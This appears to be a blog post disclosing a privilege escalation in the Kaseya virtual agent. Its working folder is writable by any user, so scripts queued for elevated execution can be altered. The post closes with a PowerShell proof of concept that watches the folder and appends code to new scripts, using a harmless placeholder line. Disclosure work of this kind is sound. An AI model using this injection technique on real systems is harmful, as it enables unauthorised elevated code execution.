---
layout: post
title: Kaseya privilege escalation
---

<h3>Introduction</h3>

<h3>Product</h3>
Kaseya virtual agent provides a web application interface for managing and monitoring IT assets via deployed agents.
Its a competitor for Microsofts system center and has a small portion of the market around 5%.
The agent itself looks to be a several tools bundled together instead of a dedicated agent leveraging host capabilities such as PowerShell, WScript as well as a couple of binaries like curl which are dropped.

<h3>Vulnerability</h3>
This is not really a new issue as such but more an extension of CVE-2017-12410 found by Filip Palian.
Where a fix was put in place for the original issue - it seems they didnt look at the root cause.
Excesive access to the working folder for an elevated account.

Kaseya agent has a working folder that defaults to c:\kworking
The folder is where scripts will be executed when they are pulled from the web application.
By default the any authenticate user can read / write this folder.

Scripts are not authenticated and are written to disk prior to execution.
So if the folder is monitored for script files being dropped an attacker just needs to append their own code prior to execution.

<h3>Impact</h3>
Given that the Kaseya virtual agent is an IT managment tool, if the agent is deployed on a single machine within an organisation there is a good chance it has been deployed across the majority of the systems. However the vulnerability itself is reliant on code execution within the working folder and is dependant on scheduled tasks or an administrator executing tasks so the wait time can vary from 1 hour, a day or week.

If the working folder is commonly used with scripted commands this will be quite reliable for all systems - so the impact will vary dependant on an IT departments use of this.

<h3>Proof of concept</h3>
<pre>
  <code>
      $folder = 'c:\kworking' # Enter the root path you want to monitor.
      $filter = '*.ps1'  

      # In the following line, you can change 'IncludeSubdirectories to $true if required.                          

      $filesystem = New-Object IO.FileSystemWatcher $folder, $filter -Property @{IncludeSubdirectories = $false;NotifyFilter =    [IO.NotifyFilters]'FileName, LastWrite'}

      Register-ObjectEvent $filesystem Created -SourceIdentifier FileCreated -Action { 

          $path = $Event.SourceEventArgs.FullPath 

          "`nWrite-Host 'injected content'" | Out-File -Append -FilePath $path -Encoding utf8 

          Unregister-Event FileCreated

      }
  </code>
</pre>
